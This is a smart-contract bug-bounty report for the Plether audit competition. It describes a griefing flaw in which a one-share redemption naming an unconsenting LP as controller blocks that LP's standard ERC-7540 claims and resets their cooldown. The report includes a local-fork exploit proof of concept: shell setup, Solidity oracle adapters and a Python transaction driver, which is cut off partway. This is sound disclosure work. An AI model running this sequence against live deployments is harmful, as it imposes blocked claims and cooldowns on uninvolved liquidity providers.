# \#97960 [SC-Low] Unsolicited controller dust poisons LP redemption heads and makes cleanup reset the victim's cooldown

**Submitted on Nov 4th 2026 at 03:52:56 UTC by @FestiveSRT for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97960
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

An ordinary mature tranche-share owner can spend one share atom to nominate an unrelated LP as the controller of a zero-output redemption. Permissionless settlement places the resulting refundable position at that LP's controller-keyed FIFO head. A later positively funded redemption then reports zero capacity and reverts through the standard ERC-7540 claim surface. The LP can use Plether's custom explicit-request-ID claim and leave the hostile head in place, or clear the head with a corrective refund claim that starts the normal one-hour transfer/new-redemption cooldown for the LP's whole wallet. This is Medium griefing: no principal is stolen or permanently frozen, but an unprivileged attacker can force exceptional recovery, a corrective transaction, and cooldown-bearing cleanup.

## Vulnerability Details

### Acknowledged predecessor and incomplete-fix distinction

This report discloses Cecuro LOW-40 first because it is the closest acknowledged root. LOW-40 showed that a controller could direct a share-delivering claim, cancellation, or refund to an unrelated receiver and thereby reset that receiver's cooldown. The published fix requires `receiver == controller`; the frozen source describes that equality as preventing one account from imposing another holder's cooldown.

This route keeps the repaired predicate true. The omitted edge occurs earlier: `requestRedeem(shares, controller, owner)` authenticates the owner of the shares, but it lets that owner nominate an unrelated, unconsenting address as controller. The attacker therefore makes the victim the controller of the attacker's own terminal refund. Cleanup returns the share to that controller, exactly as LOW-40's fix requires, yet still reaches the prohibited cross-account cooldown consequence.

The report is thus a narrow incomplete-fix identity/ordering route, not a claim that the ERC-7540 controller parameter is itself unauthorized. The competition rules permit a same-root report only when the frozen fix is incomplete or introduced a different defect. If LOW-40 is interpreted as acknowledging every possible route to another holder's cooldown, the report has material duplicate risk; the concrete distinction is that LOW-40's implemented predicate remains true throughout this PoC and its fix did not change controller selection or terminal-head isolation.

Closest neighboring disclosures are LOW-39 (third-party receiver dust and the same receiver repair bundle), MED-24 (bounded global processing of zero-output epochs), LOW-67 (accepted full-balance dust exits), and SC-H2 (a superseded synchronous zero-withdraw cooldown reset). MED-29 and MED-5 concern different rounding-loss and refund-deadlock roots. None of those retained disclosures describes the composition proved here: an owner-authorized one-atom redemption naming a pre-existing unrelated LP/controller, settlement into that controller's refundable FIFO head, and a later funded standard claim pinned behind it.

### Root cause

Four rules compose unsafely:

1. `requestRedeem` checks authority over `owner` shares but accepts a distinct nonzero `controller` without that controller's consent (`TrancheVault.sol:606-631`).
2. `_requireMinimumRedeemSize` permits an otherwise below-minimum redemption when it consumes the owner's complete available balance (`TrancheVault.sol:1611-1617`). An attacker can therefore retain exactly one mature share atom and submit it.
3. `_enqueueRedeemRequest` and `_appendControllerRedeem` store the request in the selected controller's FIFO (`TrancheVault.sol:688-707` and `:1783-1796`). If that controller's queue is empty/head-eligible, the hostile request becomes its head.
4. Standard `maxWithdraw`, `maxRedeem`, `withdraw`, and `redeem` consume only `controllerRedeemHead[controller]`, while the custom `claimRedeem(requestId, ...)` can bypass the head (`TrancheVault.sol:998-1020` and `:1299-1310`). Refund removal requires the controller or its approved operator and, under LOW-40's fix, returns nonzero shares only to that controller; the return writes `lastDepositTime[controller]` (`TrancheVault.sol:916-946` and `:1620-1627`).

### Permissionless attack sequence

1. The attacker acquires mature tranche shares, transfers all but one share atom away, and waits until the ordinary deposit cooldown has elapsed.
2. While the victim/controller queue is empty or otherwise head-eligible, the attacker calls `requestRedeem(1, victim, attacker)`. The attacker has authority only over its own share. The victim grants no approval and takes no action.
3. The request's asset quote rounds to zero. During ordinary permitted LP settlement, `HousePool._fundRedemptionPhase` takes the zero-quote branch and marks/refunds the epoch remainder. The attacker may call the permissionless Router settlement function itself, but needs no oracle manipulation, keeper privilege, governance role, or victim cooperation.
4. In a later request epoch, the victim submits an ordinary positively funded redemption under the same controller. Separate epochs are important: co-aggregation into the poison epoch is not the claimed ordering.
5. The hostile refundable request remains `controllerRedeemHead[victim]`. The later request is funded, but `maxRedeem(victim)` is zero and standard `redeem` reverts because both resolve only the oldest head.
6. The victim has two bounded responses. It can call Plether's nonstandard explicit-ID `claimRedeem(laterRequestId, ...)`, receiving the funded assets while leaving the hostile head. Alternatively, the victim or an approved operator can remove the hostile head with `claimRedeemRefund`. That corrective call returns the attacker's one share atom to the victim, advances the head, and starts the ordinary 3,600-second whole-wallet transfer/new-redemption cooldown.

The attacker does not directly start the cooldown: cleanup does. Existing funded assets remain reachable by explicit ID, so this report does not claim theft, insolvency, permanent freezing, or an unconditional one-hour fund freeze.

### Proof summary and reachability

The inline PoC is a standalone Python transaction driver, not a unit test. It forks the listed Arbitrum Sepolia v2.0.0 deployment locally at block `325561334`, verifies all 30 published runtime hashes, changes no in-scope runtime or storage slot, and uses five distinct ordinary unlocked local-Anvil EOAs. Only the out-of-scope Pyth address and ArbSys precompile receive deterministic local adapter code. The target sends every protocol transaction to loopback Anvil; the upstream archive provider is used only by Anvil to hydrate fork state.

The retained one-shot run produced 85/85 PASS rows and the terminal marker `AF009 DEPLOYED-FORK PASS; RUN CONSUMED; DO NOT RERUN`. It measured a one-atom attacker share sacrifice, poison epoch `498249`, separate victim epoch `498250`, 20 local transactions, and the exact 3,600-second cooldown boundary. It proves the cleanup and explicit-ID branches against the listed deployed runtimes. The earlier exact-source diagnostic control rejected foreign-controller assignment; no second fork target was needed or run.

The PoC establishes reachability in the competition's named v2.0.0 deployment comparator, not a live-user population claim. `TrancheVault.sol` is expressly in scope and shared by both tranche deployments. The report does not claim that a particular Arbitrum One LP is presently queued behind such a head.

## Impact Details

The selected in-scope impact is **Medium — Griefing**. The attacker is an ordinary mature-share owner; the distinct harmed party is an unrelated LP/controller. The actor-controlled call creates a persistent per-controller degraded state in which:

- the standard ERC-7540 claim view reports zero and the standard claim reverts despite a later funded request;
- standard-only integrations must add Plether-specific explicit-ID recovery or remain unable to service the funded request;
- removing the hostile head requires an additional controller/operator transaction; and
- successful cleanup imposes the documented one-hour transfer/new-redemption cooldown on the controller's entire remaining share balance.

The attacker's durable stake cost is one share atom plus gas. The deployed-fork trace measured `552,922` gas for the attacker's poison request, `36,535` for the reverted standard claim, `172,846` for the explicit-ID bypass, `169,874` for cleanup, and `28,211` for the cooldown transfer denial. These are raw local transaction gas measurements and are not converted into a dollar ratio here. The victim's operational damage depends on its integration and wallet size, so no invented dollar loss is claimed. After cleanup and restoration of a head-eligible queue, the pattern can be repeated with another mature share atom.

This fits griefing rather than `Temporary freezing of funds for at least one hour`: the attacker earns no profit and forces suboptimal state and corrective work, but the cooldown begins only if the victim chooses cleanup and funded assets remain accessible through the custom explicit-ID path.

## Recommendation

Require affirmative controller authorization when `controller != owner`, or otherwise isolate terminal/refundable positions so an unsolicited controller cannot acquire a hostile standard head. A production fix must preserve legitimate ERC-7540 operator/controller workflows. It should also ensure that removing terminal dust cannot impose a wallet-wide cooldown on an address that never consented to the underlying request.

Add regressions for an unconsenting foreign controller, a one-atom full-wallet request, separate settlement epochs, standard-head views and claims, the explicit-ID bypass, refund cleanup, and the exact cooldown boundary. A diagnostic `controller == owner` guard closes this PoC but is intentionally broader than a final ERC-7540-compatible remedy.

## References

- [`requestRedeem` accepts an independently selected controller](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L606-L631)
- [Controller-keyed request insertion](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L688-L707)
- [Standard claims and the explicit-ID claim](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L998-L1020)
- [Standard maximums consume the oldest controller head](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1299-L1310)
- [Full-wallet exception and LOW-40 receiver predicate](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1611-L1627)
- [Controller FIFO insertion/removal](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1783-L1821)
- [Refund cleanup writes the receiver cooldown](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L916-L946)
- [Zero-quote redemption-refund branch](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L944-L981)
- [Permissionless Router LP settlement](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouter.sol#L474-L484)
- [Cecuro audit containing LOW-40 and neighboring disclosures](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-ai-audit-report-2026-10-26.pdf)


## Proof of Concept

# Proof of Concept

This is the complete non-unit exploit PoC. It runs against the exact listed Arbitrum
Sepolia v2.0.0 deployment on a fresh local Anvil fork at block `325561334`. It verifies
all 30 deployed runtime hashes before mutation, changes no in-scope runtime or storage
slot, and drives unchanged Plether entrypoints with distinct ordinary local EOAs. The
only local code replacements are the out-of-scope Pyth dependency and ArbSys precompile.
The target contains only the loopback RPC URL; Anvil alone reads the archive provider to
hydrate fork state. No public-chain transaction, broadcast, impersonation, balance
write, storage write, test contract or test entrypoint is used.

## Reproduction

Requirements: Python 3, Git, Foundry with Anvil/Cast, and an archive-capable Arbitrum
Sepolia RPC URL. Save the three code files and `foundry.toml` below in this layout:

```text
af009-repro/
├── audit-comp-plether/          # exact competition repository
└── af009-poc/
    ├── foundry.toml
    └── code/
        ├── LocalArbSysAdapter.sol
        ├── LocalPythAdapter.sol
        └── run_af009_local_target.py
```

Create the exact source checkout, compile only the two external adapters, start a fresh
local fork, and run the transaction driver:

```sh
mkdir af009-repro
cd af009-repro
git clone https://github.com/immunefi-team/audit-comp-plether.git
git -C audit-comp-plether checkout a82d4fefb02768e5b3bddcc97dee371eee24fea8
mkdir -p af009-poc/code
# Save the four inline files below at their shown paths.
cd af009-poc
forge build

export PLETHER_FORK_RPC_URL='https://YOUR_PRIVATE_ARBITRUM_SEPOLIA_ARCHIVE_RPC'
anvil --quiet --host 127.0.0.1 --port 28971 \
  --fork-url "$PLETHER_FORK_RPC_URL" \
  --fork-block-number 325561334 --no-rate-limit \
  --gas-limit 500000000 --code-size-limit 1000000 &
AF009_ANVIL_PID=$!
trap 'kill "$AF009_ANVIL_PID" 2>/dev/null || true; wait "$AF009_ANVIL_PID" 2>/dev/null || true' EXIT
until cast chain-id --rpc-url http://127.0.0.1:28971 >/dev/null 2>&1; do sleep 0.2; done

mkdir evidence
python3 code/run_af009_local_target.py \
  --repo ../audit-comp-plether \
  --foundry-bin "$(dirname "$(command -v forge)")" \
  --evidence-dir evidence \
  --ack-final-run
```

### `af009-poc/foundry.toml`

```toml
[profile.default]
src = "code"
script = "code"
test = "disabled-tests"
out = "work/out"
cache_path = "work/cache"
libs = [
    "../audit-comp-plether",
    "../audit-comp-plether/lib",
]
auto_detect_remappings = false
remappings = [
    "@plether/shared/=../audit-comp-plether/packages/shared/src/",
]
solc_version = "0.8.35"
auto_detect_solc = false
optimizer = true
optimizer_runs = 200
via_ir = true
```

### `af009-poc/code/LocalArbSysAdapter.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

/// @notice Minimal local-Anvil compatibility adapter for Arbitrum's external ArbSys precompile.
/// @dev Installed only at local address(100). It does not replace or write an in-scope contract.
contract LocalArbSysAdapter {
    function arbBlockNumber() external view returns (uint256) {
        return block.number;
    }
}
```

### `af009-poc/code/LocalPythAdapter.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {IPyth, PythStructs} from "@plether/shared/interfaces/IPyth.sol";

/// @notice Deterministic adapter installed only at the external Pyth address on local Anvil.
/// @dev The six ids, bases, inversion flags and order are the immutable deployed v2.0.0 basket.
///      The first update blob is abi.encode(1e8). This is not represented as signed Pyth data.
contract LocalPythAdapter is IPyth {
    uint256 private constant BASKET_SCALE = 1e8;
    int32 private constant ADAPTER_EXPO = -12;

    function getPriceUnsafe(bytes32 id) external view returns (PythStructs.Price memory price) {
        _requireKnownId(id);
        return PythStructs.Price({price: 100_000_000, conf: 0, expo: -8, publishTime: block.timestamp});
    }

    function getPriceNoOlderThan(bytes32 id, uint256) external view returns (PythStructs.Price memory price) {
        _requireKnownId(id);
        return PythStructs.Price({price: 100_000_000, conf: 0, expo: -8, publishTime: block.timestamp});
    }

    function updatePriceFeeds(bytes[] calldata updateData) external payable {
        require(updateData.length != 0, "missing local price");
    }

    function parsePriceFeedUpdates(
        bytes[] calldata updateData,
        bytes32[] calldata priceIds,
        uint64,
        uint64 maxPublishTime
    ) external payable returns (PythStructs.PriceFeed[] memory priceFeeds) {
        return _feeds(updateData, priceIds, maxPublishTime);
    }

    function parsePriceFeedUpdatesUnique(
        bytes[] calldata updateData,
        bytes32[] calldata priceIds,
        uint64,
        uint64 maxPublishTime
    ) external payable returns (PythStructs.PriceFeed[] memory priceFeeds) {
        return _feeds(updateData, priceIds, maxPublishTime);
    }

    function getUpdateFee(bytes[] calldata) external pure returns (uint256 feeAmount) {
        return 0;
    }

    function _feeds(bytes[] calldata updateData, bytes32[] calldata priceIds, uint64 publishTime)
        private
        pure
        returns (PythStructs.PriceFeed[] memory priceFeeds)
    {
        require(updateData.length == 1, "one local price blob required");
        require(priceIds.length == 6, "unexpected feed count");
        uint256 desiredBasketPrice = abi.decode(updateData[0], (uint256));
        require(desiredBasketPrice == 100_000_000, "unregistered local price");

        priceFeeds = new PythStructs.PriceFeed[](priceIds.length);
        for (uint256 i; i < priceIds.length; ++i) {
            bytes32 expected = _feedId(i);
            require(priceIds[i] == expected, "unexpected feed order");
            PythStructs.Price memory value = PythStructs.Price({
                price: _rawPrice(i, desiredBasketPrice), conf: 0, expo: ADAPTER_EXPO, publishTime: publishTime
            });
            priceFeeds[i] = PythStructs.PriceFeed({id: expected, price: value, emaPrice: value});
        }
    }

    function _rawPrice(uint256 index, uint256 desiredBasketPrice) private pure returns (int64) {
        uint256 normalized = (_basePrice(index) * desiredBasketPrice) / BASKET_SCALE;
        if (index == 0) {
            normalized += 47;
        }
        require(normalized != 0, "zero normalized price");
        uint256 raw = _inverted(index) ? (1e20 + (normalized / 2)) / normalized : normalized * 1e4;
        require(raw <= uint256(int256(type(int64).max)), "raw price overflow");
        // forge-lint: disable-next-line(unsafe-typecast)
        return int64(int256(raw));
    }

    function _requireKnownId(bytes32 id) private pure {
        for (uint256 i; i < 6; ++i) {
            if (id == _feedId(i)) return;
        }
        revert("unknown local feed");
    }

    function _feedId(uint256 index) private pure returns (bytes32) {
        if (index == 0) return 0xa995d00bb36a63cef7fd2c287dc105fc8f3d93779f062f09551b0af3e81ec30b;
        if (index == 1) return 0xef2c98c804ba503c6a707e38be4dfbb16683775f195b091252bf24693042fd52;
        if (index == 2) return 0x84c2dde9633d93d1bcad84e7dc41c9d56578b7ec52fabedc1f335d673df0a7c1;
        if (index == 3) return 0x3112b03a41c910ed446852aacf67118cb1bec67b2cd0b9a214c58cc0eaa2ecca;
        if (index == 4) return 0x8ccb376aa871517e807358d4e3cf0bc7fe4950474dbe6c9ffc21ef64e43fc676;
        if (index == 5) return 0x0b1e3297e69f162877b577b0d6a47a0d63b2392bc8499e6540da4187a63e28f8;
        revert("feed index");
    }

    function _basePrice(uint256 index) private pure returns (uint256) {
        if (index == 0) return 117_500_000;
        if (index == 1) return 638_000;
        if (index == 2) return 134_480_000;
        if (index == 3) return 72_880_000;
        if (index == 4) return 10_860_000;
        if (index == 5) return 126_100_000;
        revert("base index");
    }

    function _inverted(uint256 index) private pure returns (bool) {
        require(index < 6, "inversion index");
        return index != 0 && index != 2;
    }
}
```

### `af009-poc/code/run_af009_local_target.py`

```python
#!/usr/bin/env python3
"""One-shot AF-009 transaction sequence against a pre-started loopback Anvil fork.

This file has one endpoint, the literal loopback Anvil URL. It has no upstream URL,
credential, provider environment lookup, or process-orchestration path. All protocol
transactions are sent by distinct unlocked local-Anvil EOAs directly to the unmodified
published v2.0.0 contracts. The local Anvil process owns state hydration, while the
operator's one-shot command owns final-run authority.
"""

from __future__ import annotations

import argparse
import json
import pathlib
import subprocess
import time
import urllib.error
import urllib.request


PINNED_COMMIT = "a82d4fefb02768e5b3bddcc97dee371eee24fea8"
FORK_BLOCK = 325_561_334
CHAIN_ID = 421_614
LOCAL_URL = "http://127.0.0.1:28971"

TOKEN = "0x3d051dbbf5ff427a4ae8ad09746902666af8fb9d"
POOL = "0xeb5604c393843b2f3c347ec24fa9ddad6ab2131e"
JUNIOR = "0x4a8b67184a1e3224c11a191cc69f22c50eef734e"
SENIOR = "0x5dc42ba5a1e8dd3e1b6868d10f66a9bf8fb5b83d"
ROUTER = "0x918663d6da8cb33b325a04c4a5e8c51d42f3b444"
ENGINE = "0xca18a6783d7542f9d2f28f4f259772b74c4d6baa"
PYTH = "0x0b73614636c855bf23f342f307fb981a3e47f42b"
ARB_SYS = "0x0000000000000000000000000000000000000064"

VICTIM_ASSETS = 100 * 10**6
ATTACKER_ASSETS = 1 * 10**6
LOCAL_MARK = 100_000_000
MAX_TX_GAS = 100_000_000

_run_handle = None
_transaction_count = 0


class RpcFailure(RuntimeError):
    pass


def output(*argv: str, cwd: pathlib.Path | None = None) -> str:
    return subprocess.check_output(list(argv), cwd=cwd, text=True).strip()


def record(step: str, status: str, **details) -> None:
    if _run_handle is None:
        raise RuntimeError("run log is not open")
    row = {"time": time.strftime("%Y-%m-%dT%H:%M:%S%z"), "step": step, "status": status, **details}
    _run_handle.write(json.dumps(row, sort_keys=True) + "\n")
    _run_handle.flush()
    print(f"{step}: {status}", flush=True)


def rpc(method: str, params: list):
    payload = json.dumps({"jsonrpc": "2.0", "id": 1, "method": method, "params": params}).encode()
    request = urllib.request.Request(LOCAL_URL, data=payload, headers={"Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(request, timeout=120) as response:
            body = json.loads(response.read())
    except urllib.error.HTTPError as error:
        raw = error.read()
        try:
            body = json.loads(raw)
        except json.JSONDecodeError as decode_error:
            raise RpcFailure(f"{method}: HTTP {error.code} non-JSON response") from decode_error
    if "error" in body:
        item = body["error"]
        raise RpcFailure(f"{method}: code={item.get('code')} message={item.get('message')}")
    return body["result"]


def cast(args: argparse.Namespace, *values: str) -> str:
    return output(str(args.cast), *values, cwd=args.lane)


def calldata(args: argparse.Namespace, signature: str, *values) -> str:
    return cast(args, "calldata", signature, *(str(value) for value in values))


def keccak_hex(args: argparse.Namespace, value: str) -> str:
    return cast(args, "keccak", value).lower()


def artifact(args: argparse.Namespace, source_name: str, contract_name: str) -> dict:
    path = args.lane / "work/out" / source_name / f"{contract_name}.json"
    with path.open(encoding="utf-8") as handle:
        return json.load(handle)


def object_hex(value: str) -> str:
    return value if value.startswith("0x") else "0x" + value


def words(raw: str) -> list[int]:
    payload = raw[2:]
    if len(payload) % 64:
        raise AssertionError("non-word-aligned ABI response")
    return [int(payload[index : index + 64], 16) for index in range(0, len(payload), 64)]


def call_raw(args: argparse.Namespace, to: str, signature: str, *values, sender: str | None = None) -> str:
    transaction = {"to": to, "data": calldata(args, signature, *values)}
    if sender is not None:
        transaction["from"] = sender
    return rpc("eth_call", [transaction, "latest"])


def uint_call(args: argparse.Namespace, to: str, signature: str, *values) -> int:
    result = words(call_raw(args, to, signature, *values))
    if len(result) != 1:
        raise AssertionError(f"{signature}: expected one return word")
    return result[0]


def address_call(args: argparse.Namespace, to: str, signature: str, *values) -> str:
    raw = call_raw(args, to, signature, *values)
    if len(raw) != 66:
        raise AssertionError(f"{signature}: invalid address response")
    return "0x" + raw[-40:].lower()


def bool_call(args: argparse.Namespace, to: str, signature: str, *values) -> bool:
    value = uint_call(args, to, signature, *values)
    if value not in (0, 1):
        raise AssertionError(f"{signature}: invalid bool {value}")
    return bool(value)


def assert_equal(label: str, observed, expected) -> None:
    ok = observed == expected
    record(label, "PASS" if ok else "FAIL", observed=observed, expected=expected)
    if not ok:
        raise AssertionError(f"{label}: observed {observed!r}, expected {expected!r}")


def assert_gt(label: str, observed: int, boundary: int) -> None:
    ok = observed > boundary
    record(label, "PASS" if ok else "FAIL", observed=observed, boundary=boundary)
    if not ok:
        raise AssertionError(f"{label}: {observed} is not greater than {boundary}")


def assert_distinct(label: str, values: list[str]) -> None:
    assert_equal(label, len(set(values)), len(values))


def wait_receipt(tx_hash: str) -> dict:
    deadline = time.monotonic() + 120
    while time.monotonic() < deadline:
        receipt = rpc("eth_getTransactionReceipt", [tx_hash])
        if receipt is not None:
            return receipt
        time.sleep(0.05)
    raise RuntimeError(f"receipt timeout for {tx_hash}")


def send(
    args: argparse.Namespace,
    sender: str,
    to: str,
    signature: str,
    values: tuple,
    label: str,
    *,
    expected_status: int = 1,
    value: int = 0,
) -> dict:
    global _transaction_count
    transaction = {
        "from": sender,
        "to": to,
        "data": calldata(args, signature, *values),
        "gas": hex(MAX_TX_GAS),
        "value": hex(value),
    }
    receipt = wait_receipt(rpc("eth_sendTransaction", [transaction]))
    observed_status = int(receipt["status"], 16)
    _transaction_count += 1
    status = "PASS" if observed_status == expected_status else "FAIL"
    record(
        label,
        status,
        expected_status=expected_status,
        observed_status=observed_status,
        gas_used=int(receipt["gasUsed"], 16),
        transaction_hash=receipt["transactionHash"],
        block_number=int(receipt["blockNumber"], 16),
    )
    if observed_status != expected_status:
        raise AssertionError(f"{label}: transaction status {observed_status}, expected {expected_status}")
    return receipt


def current_timestamp() -> int:
    return int(rpc("eth_getBlockByNumber", ["latest", False])["timestamp"], 16)


def block_timestamp(number: int) -> int:
    return int(rpc("eth_getBlockByNumber", [hex(number), False])["timestamp"], 16)


def advance_to(timestamp: int, label: str) -> None:
    before = current_timestamp()
    if timestamp > before:
        rpc("evm_setNextBlockTimestamp", [timestamp])
    rpc("evm_mine", [])
    observed = current_timestamp()
    ok = observed >= timestamp
    record(label, "PASS" if ok else "FAIL", before=before, requested=timestamp, observed=observed)
    if not ok:
        raise AssertionError(f"{label}: local timestamp did not reach boundary")


def advance_exact_to(timestamp: int, label: str) -> None:
    before = current_timestamp()
    if before >= timestamp:
        record(label, "FAIL", before=before, requested=timestamp, reason="exact-boundary-already-reached")
        raise AssertionError(f"{label}: exact boundary was already reached")
    rpc("evm_setNextBlockTimestamp", [timestamp])
    rpc("evm_mine", [])
    observed = current_timestamp()
    assert_equal(label, observed, timestamp)


def request_epoch(args: argparse.Namespace) -> int:
    result = words(call_raw(args, JUNIOR, "getRequestEpochWindow()"))
    if len(result) != 2:
        raise AssertionError("getRequestEpochWindow(): expected two words")
    return result[0]


def manifest_runtime_check(args: argparse.Namespace) -> dict:
    with args.manifest.open(encoding="utf-8") as handle:
        release = json.load(handle)
    contracts = release.get("contracts", {})
    assert_equal("release-runtime-count", len(contracts), 30)
    rows = []
    for name, item in contracts.items():
        address = item["address"].lower()
        code = rpc("eth_getCode", [address, "latest"])
        actual = keccak_hex(args, code)
        expected = item["runtimeCodeHash"].lower()
        rows.append({"name": name, "address": address, "actual": actual, "expected": expected})
        if actual != expected:
            record("runtime-hashes", "FAIL", rows=rows)
            raise AssertionError(f"runtime mismatch: {name}")
    record("runtime-hashes", "PASS", count=len(rows), rows=rows)
    return release


def install_external_adapter(args: argparse.Namespace, address: str, source: str, contract: str, label: str) -> None:
    build = artifact(args, source, contract)
    runtime = object_hex(build["deployedBytecode"]["object"])
    rpc("anvil_setCode", [address, runtime])
    observed = rpc("eth_getCode", [address, "latest"])
    assert_equal(label, keccak_hex(args, observed), keccak_hex(args, runtime))


def settle_epoch(args: argparse.Namespace, keeper: str, epoch: int, label: str) -> dict:
    maturity = uint_call(args, POOL, "lpEpochStart(uint256)", epoch)
    advance_to(maturity, f"{label}-maturity")
    price_blob = "0x" + hex(LOCAL_MARK)[2:].zfill(64)
    return send(args, keeper, ROUTER, "settleLpEpoch(bytes[])", (f"[{price_blob}]",), f"{label}-settle")


def queue_preconditions(args: argparse.Namespace, victim: str) -> None:
    for vault_name, vault in (("junior", JUNIOR), ("senior", SENIOR)):
        assert_equal(f"{vault_name}-deposit-queue-empty", uint_call(args, vault, "depositQueueHead()"), 0)
        assert_equal(f"{vault_name}-redeem-queue-empty", uint_call(args, vault, "redeemQueueHead()"), 0)
    assert_equal("victim-controller-head-empty", uint_call(args, JUNIOR, "controllerRedeemHead(address)", victim), 0)
    assert_equal("victim-controller-tail-empty", uint_call(args, JUNIOR, "controllerRedeemTail(address)", victim), 0)


def binding_preconditions(args: argparse.Namespace, release: dict) -> None:
    contracts = release["contracts"]
    expected = {
        "settlementToken": TOKEN,
        "housePool": POOL,
        "juniorVault": JUNIOR,
        "seniorVault": SENIOR,
        "orderRouter": ROUTER,
        "cfdEngine": ENGINE,
    }
    for name, address in expected.items():
        assert_equal(f"manifest-{name}", contracts[name]["address"].lower(), address)
    assert_equal("pool-token-binding", address_call(args, POOL, "settlementToken()"), TOKEN)
    assert_equal("pool-junior-binding", address_call(args, POOL, "juniorVault()"), JUNIOR)
    assert_equal("pool-senior-binding", address_call(args, POOL, "seniorVault()"), SENIOR)
    assert_equal("junior-pool-binding", address_call(args, JUNIOR, "POOL()"), POOL)
    assert_equal("junior-asset-binding", address_call(args, JUNIOR, "asset()"), TOKEN)
    assert_equal("pool-paused", bool_call(args, POOL, "paused()"), False)
    assert_equal("lp-settlement-paused", bool_call(args, POOL, "lpEpochSettlementPaused()"), False)
    assert_equal("trading-active", bool_call(args, POOL, "isTradingActive()"), True)
    assert_equal("engine-degraded", bool_call(args, ENGINE, "degradedMode()"), False)


def acquire_shares(args: argparse.Namespace, actors: dict[str, str]) -> tuple[int, int]:
    for role, assets in (("victim", VICTIM_ASSETS), ("attacker", ATTACKER_ASSETS)):
        account = actors[role]
        send(args, account, TOKEN, "mint(address,uint256)", (account, assets), f"{role}-mint")
        send(args, account, TOKEN, "approve(address,uint256)", (JUNIOR, assets), f"{role}-approve")

    victim_epoch = request_epoch(args)
    send(
        args,
        actors["victim"],
        JUNIOR,
        "requestDeposit(uint256,address,address)",
        (VICTIM_ASSETS, actors["victim"], actors["victim"]),
        "victim-deposit-request",
    )
    attacker_epoch = request_epoch(args)
    send(
        args,
        actors["attacker"],
        JUNIOR,
        "requestDeposit(uint256,address,address)",
        (ATTACKER_ASSETS, actors["attacker"], actors["attacker"]),
        "attacker-deposit-request",
    )
    record(
        "deposit-epoch-order",
        "PASS",
        victim_epoch=victim_epoch,
        attacker_epoch=attacker_epoch,
        same_epoch=attacker_epoch == victim_epoch,
    )
    settle_epoch(args, actors["keeper"], victim_epoch, "victim-deposit-epoch")
    if attacker_epoch != victim_epoch:
        assert_gt("attacker-deposit-epoch-is-later", attacker_epoch, victim_epoch)
        settle_epoch(args, actors["keeper"], attacker_epoch, "attacker-deposit-epoch")

    shares = {}
    for role, assets, epoch in (
        ("victim", VICTIM_ASSETS, victim_epoch),
        ("attacker", ATTACKER_ASSETS, attacker_epoch),
    ):
        account = actors[role]
        claimable = uint_call(args, JUNIOR, "claimableDepositRequest(uint256,address)", epoch, account)
        assert_equal(f"{role}-claimable-deposit-assets", claimable, assets)
        send(
            args,
            account,
            JUNIOR,
            "claimDeposit(uint256,uint256,address,address)",
            (epoch, claimable, account, account),
            f"{role}-deposit-claim",
        )
        shares[role] = uint_call(args, JUNIOR, "balanceOf(address)", account)
        assert_gt(f"{role}-shares", shares[role], 0)
    return shares["victim"], shares["attacker"]


def run_target(args: argparse.Namespace, accounts: list[str], release: dict) -> dict[str, object]:
    roles = ("attacker", "attacker_reserve", "victim", "keeper", "sink")
    if len(accounts) < len(roles):
        raise RuntimeError("local Anvil must provide five distinct unlocked development accounts")
    actors = {role: accounts[index].lower() for index, role in enumerate(roles)}
    assert_distinct("distinct-local-eoas", list(actors.values()))

    binding_preconditions(args, release)
    queue_preconditions(args, actors["victim"])
    install_external_adapter(args, PYTH, "LocalPythAdapter.sol", "LocalPythAdapter", "external-pyth-adapter")
    install_external_adapter(args, ARB_SYS, "LocalArbSysAdapter.sol", "LocalArbSysAdapter", "external-arbsys-adapter")
    rpc("evm_mine", [])

    victim_shares, attacker_shares = acquire_shares(args, actors)
    cooldown = uint_call(args, JUNIOR, "DEPOSIT_COOLDOWN()")
    unlock = max(
        uint_call(args, JUNIOR, "lastDepositTime(address)", actors["victim"]) + cooldown,
        uint_call(args, JUNIOR, "lastDepositTime(address)", actors["attacker"]) + cooldown,
    )
    advance_to(unlock, "initial-share-cooldown")
    assert_equal("victim-initially-unlocked", uint_call(args, JUNIOR, "maxRequestRedeem(address)", actors["victim"]), victim_shares)

    send(
        args,
        actors["attacker"],
        JUNIOR,
        "transfer(address,uint256)",
        (actors["attacker_reserve"], attacker_shares - 1),
        "attacker-retain-one-share",
    )
    assert_equal("attacker-one-share", uint_call(args, JUNIOR, "balanceOf(address)", actors["attacker"]), 1)
    assert_equal(
        "attacker-one-share-full-balance-exception",
        uint_call(args, JUNIOR, "maxRequestRedeem(address)", actors["attacker"]),
        1,
    )
    assert_equal("one-share-zero-quote", uint_call(args, JUNIOR, "estimateRedeemAssets(uint256)", 1), 0)

